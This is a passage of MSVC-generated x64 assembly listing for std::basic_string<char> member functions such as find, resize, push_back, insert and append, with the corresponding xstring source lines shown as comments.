?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 32
$T1 = 40
_Requested$ = 64
_Old$ = 72
_Max$ = 80
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth, COMDAT

; 4750 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4751 :         const size_type _Masked = _Requested | _ALLOC_MASK;

	mov	rax, QWORD PTR _Requested$[rsp]
	or	rax, 15
	mov	QWORD PTR _Masked$[rsp], rax

; 4752 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	mov	rax, QWORD PTR _Max$[rsp]
	cmp	QWORD PTR _Masked$[rsp], rax
	jbe	SHORT $LN2@Calculate_

; 4753 :             return _Max;

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4754 :         }
; 4755 : 
; 4756 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

	xor	edx, edx
	mov	rax, QWORD PTR _Old$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Max$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Old$[rsp], rax
	jbe	SHORT $LN3@Calculate_

; 4757 :             return _Max;

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4758 :         }
; 4759 : 
; 4760 :         return (_STD max)(_Masked, _Old + _Old / 2);

	xor	edx, edx
	mov	rax, QWORD PTR _Old$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Old$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR $T1[rsp], rax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR _Masked$[rsp]
	call	??$max@_K@std@@YAAEB_KAEB_K0@Z		; std::max<unsigned __int64>
	mov	rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4761 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
_TEXT	SEGMENT
tv72 = 48
this$ = 80
_Right$ = 88
_Off$ = 96
?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find, COMDAT

; 4393 :     _NODISCARD _CONSTEXPR20 size_type find(const basic_string& _Right, const size_type _Off = 0) const noexcept {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 4394 :         // look for _Right beginning at or after _Off
; 4395 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	QWORD PTR tv72[rsp], rax
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	mov	QWORD PTR [rsp+32], rcx
	mov	rcx, QWORD PTR tv72[rsp]
	mov	r9, rcx
	mov	r8, QWORD PTR _Off$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rcx+16]
	mov	rcx, rax
	call	??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z ; std::_Traits_find<std::char_traits<char> >

; 4396 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize));
; 4397 :     }

	add	rsp, 72					; 00000048H
	ret	0
?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv68 = 0
this$ = 32
?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty, COMDAT

; 4252 :     _NODISCARD _CONSTEXPR20 bool empty() const noexcept {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 4253 :         return _Mypair._Myval2._Mysize == 0;

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+16], 0
	jne	SHORT $LN3@empty
	mov	DWORD PTR tv68[rsp], 1
	jmp	SHORT $LN4@empty
$LN3@empty:
	mov	DWORD PTR tv68[rsp], 0
$LN4@empty:
	movzx	eax, BYTE PTR tv68[rsp]

; 4254 :     }

	add	rsp, 24
	ret	0
?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z
_TEXT	SEGMENT
_Old_size$ = 32
this$ = 64
_New_size$ = 72
_Ch$ = 80
?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize, COMDAT

; 4166 :     _CONSTEXPR20 void resize(_CRT_GUARDOVERFLOW const size_type _New_size, const _Elem _Ch = _Elem()) {

$LN5:
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4167 :         // determine new length, padding with _Ch elements as needed
; 4168 :         const size_type _Old_size = size();

	mov	rcx, QWORD PTR this$[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	QWORD PTR _Old_size$[rsp], rax

; 4169 :         if (_New_size <= _Old_size) {

	mov	rax, QWORD PTR _Old_size$[rsp]
	cmp	QWORD PTR _New_size$[rsp], rax
	ja	SHORT $LN2@resize

; 4170 :             _Eos(_New_size);

	mov	rdx, QWORD PTR _New_size$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos

; 4171 :         } else {

	jmp	SHORT $LN3@resize
$LN2@resize:

; 4172 :             append(_New_size - _Old_size, _Ch);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _New_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	movzx	r8d, BYTE PTR _Ch$[rsp]
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
$LN3@resize:

; 4173 :         }
; 4174 :     }

	add	rsp, 56					; 00000038H
	ret	0
?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
$T1 = 32
_Alloc_max$ = 40
_Storage_max$ = 48
$T2 = 56
$T3 = 64
this$ = 96
?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size, COMDAT

; 4157 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 4158 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	rcx, rax
	call	?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA_KAEBV?$allocator@D@2@@Z ; std::_Default_allocator_traits<std::allocator<char> >::max_size
	mov	QWORD PTR _Alloc_max$[rsp], rax

; 4159 :         const size_type _Storage_max = // can always store small string

	mov	QWORD PTR $T1[rsp], 16
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR _Alloc_max$[rsp]
	call	??$max@_K@std@@YAAEB_KAEB_K0@Z		; std::max<unsigned __int64>
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Storage_max$[rsp], rax

; 4160 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4161 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

	mov	rax, QWORD PTR _Storage_max$[rsp]
	dec	rax
	mov	QWORD PTR $T2[rsp], rax
	call	?max@?$numeric_limits@_J@std@@SA_JXZ	; std::numeric_limits<__int64>::max
	mov	QWORD PTR $T3[rsp], rax
	lea	rdx, QWORD PTR $T2[rsp]
	lea	rcx, QWORD PTR $T3[rsp]
	call	??$min@_K@std@@YAAEB_KAEB_K0@Z		; std::min<unsigned __int64>
	mov	rax, QWORD PTR [rax]

; 4162 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4163 :         );
; 4164 :     }

	add	rsp, 88					; 00000058H
	ret	0
?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size, COMDAT

; 4153 :     _NODISCARD _CONSTEXPR20 size_type size() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 4154 :         return _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]

; 4155 :     }

	ret	0
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 48
?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str, COMDAT

; 4135 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4136 :         return _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr

; 4137 :     }

	add	rsp, 40					; 00000028H
	ret	0
?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 33
_Old_size$ = 40
_Ptr$3 = 48
this$ = 80
_Ch$ = 88
?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back, COMDAT

; 4074 :     _CONSTEXPR20 void push_back(const _Elem _Ch) { // insert element at end

$LN4:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 64					; 00000040H

; 4075 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 4076 :         if (_Old_size < _Mypair._Myval2._Myres) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+24]
	cmp	QWORD PTR _Old_size$[rsp], rax
	jae	SHORT $LN2@push_back

; 4077 :             _ASAN_STRING_MODIFY(1);
; 4078 :             _Mypair._Myval2._Mysize = _Old_size + 1;

	mov	rax, QWORD PTR _Old_size$[rsp]
	inc	rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+16], rax

; 4079 :             _Elem* const _Ptr       = _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	QWORD PTR _Ptr$3[rsp], rax

; 4080 :             _Traits::assign(_Ptr[_Old_size], _Ch);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _Ptr$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR _Ch$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 4081 :             _Traits::assign(_Ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Ptr$3[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	lea	rax, QWORD PTR [rax+rcx+1]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 4082 :             return;

	jmp	SHORT $LN1@push_back
$LN2@push_back:

; 4083 :         }
; 4084 : 
; 4085 :         _Reallocate_grow_by(

	lea	rax, QWORD PTR $T2[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 1
	rep stosb
	movzx	r9d, BYTE PTR _Ch$[rsp]
	movzx	r8d, BYTE PTR $T2[rsp]
	mov	edx, 1
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_319d5e083f45f90dcdce5dce53cbb275>,char>
$LN1@push_back:

; 4086 :             1,
; 4087 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem _Ch) {
; 4088 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 4089 :                 _Traits::assign(_New_ptr[_Old_size], _Ch);
; 4090 :                 _Traits::assign(_New_ptr[_Old_size + 1], _Elem());
; 4091 :             },
; 4092 :             _Ch);
; 4093 :     }

	add	rsp, 64					; 00000040H
	pop	rdi
	ret	0
?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z
_TEXT	SEGMENT
this$ = 48
_Off$ = 56
??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[], COMDAT

; 4060 :     /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4061 : #if _CONTAINER_DEBUG_LEVEL > 0
; 4062 :         _STL_VERIFY(_Off <= _Mypair._Myval2._Mysize, "string subscript out of range");
; 4063 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 4064 :         return _Mypair._Myval2._Myptr()[_Off];

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	add	rax, QWORD PTR _Off$[rsp]

; 4065 :     }

	add	rsp, 40					; 00000028H
	ret	0
??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z
_TEXT	SEGMENT
this$ = 48
_Off$ = 56
??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[], COMDAT

; 4052 :     _NODISCARD _CONSTEXPR20 reference operator[](const size_type _Off) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4053 : #if _CONTAINER_DEBUG_LEVEL > 0
; 4054 :         _STL_VERIFY(_Off <= _Mypair._Myval2._Mysize, "string subscript out of range");
; 4055 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 4056 :         return _Mypair._Myval2._Myptr()[_Off];

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	add	rax, QWORD PTR _Off$[rsp]

; 4057 :     }

	add	rsp, 40					; 00000028H
	ret	0
??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 48
?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::clear, COMDAT

; 3713 :     _CONSTEXPR20 void clear() noexcept { // erase all

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3714 :         _Eos(0);

	xor	edx, edx
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos
	npad	1

; 3715 :     }

	add	rsp, 40					; 00000028H
	ret	0
?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::clear
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z
_TEXT	SEGMENT
$T1 = 48
_Old_size$ = 56
_Insert_at$2 = 64
_Old_ptr$3 = 72
this$ = 96
_Off$ = 104
_Count$ = 112
_Ch$ = 120
?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::insert, COMDAT

; 3602 :         const size_type _Off, _CRT_GUARDOVERFLOW const size_type _Count, const _Elem _Ch) {

$LN4:
	mov	BYTE PTR [rsp+32], r9b
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 80					; 00000050H

; 3603 :         // insert _Count * _Ch at _Off
; 3604 :         _Mypair._Myval2._Check_offset(_Off);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR _Off$[rsp]
	mov	rcx, rax
	call	?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z ; std::_String_val<std::_Simple_types<char> >::_Check_offset

; 3605 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 3606 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	mov	rax, QWORD PTR [rax+24]
	sub	rax, rcx
	cmp	QWORD PTR _Count$[rsp], rax
	ja	$LN2@insert

; 3607 :             _ASAN_STRING_MODIFY(static_cast<difference_type>(_Count));
; 3608 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+16], rax

; 3609 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	QWORD PTR _Old_ptr$3[rsp], rax

; 3610 :             _Elem* const _Insert_at = _Old_ptr + _Off;

	mov	rax, QWORD PTR _Off$[rsp]
	mov	rcx, QWORD PTR _Old_ptr$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Insert_at$2[rsp], rax

; 3611 :             _Traits::move(_Insert_at + _Count, _Insert_at, _Old_size - _Off + 1); // move suffix + null down

	mov	rax, QWORD PTR _Off$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	inc	rax
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Insert_at$2[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	r8, rax
	mov	rdx, QWORD PTR _Insert_at$2[rsp]
	call	?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::move

; 3612 :             _Traits::assign(_Insert_at, _Count, _Ch); // fill hole

	movzx	r8d, BYTE PTR _Ch$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Insert_at$2[rsp]
	call	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3613 :             return *this;

	mov	rax, QWORD PTR this$[rsp]
	jmp	SHORT $LN1@insert
$LN2@insert:

; 3614 :         }
; 3615 : 
; 3616 :         return _Reallocate_grow_by(

	lea	rax, QWORD PTR $T1[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 1
	rep stosb
	movzx	eax, BYTE PTR _Ch$[rsp]
	mov	BYTE PTR [rsp+40], al
	mov	rax, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rsp+32], rax
	mov	r9, QWORD PTR _Off$[rsp]
	movzx	r8d, BYTE PTR $T1[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_b986da8d428e4af07c64af60eec09b61>,unsigned __int64,unsigned __int64,char>
$LN1@insert:

; 3617 :             _Count,
; 3618 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const size_type _Off,
; 3619 :                 const size_type _Count, const _Elem _Ch) {
; 3620 :                 _Traits::copy(_New_ptr, _Old_ptr, _Off);
; 3621 :                 _Traits::assign(_New_ptr + _Off, _Count, _Ch);
; 3622 :                 _Traits::copy(_New_ptr + _Off + _Count, _Old_ptr + _Off, _Old_size - _Off + 1);
; 3623 :             },
; 3624 :             _Off, _Count, _Ch);
; 3625 :     }

	add	rsp, 80					; 00000050H
	pop	rdi
	ret	0
?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::insert
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z
_TEXT	SEGMENT
$T1 = 48
$T2 = 49
_Old_size$ = 56
_Old_ptr$3 = 64
this$ = 96
_Count$ = 104
_Ch$ = 112
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT

; 3388 :     _CONSTEXPR20 basic_string& append(_CRT_GUARDOVERFLOW const size_type _Count, const _Elem _Ch) {

$LN4:
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 80					; 00000050H

; 3389 :         // append _Count * _Ch
; 3390 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 3391 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	mov	rax, QWORD PTR [rax+24]
	sub	rax, rcx
	cmp	QWORD PTR _Count$[rsp], rax
	ja	$LN2@append

; 3392 :             _ASAN_STRING_MODIFY(static_cast<difference_type>(_Count));
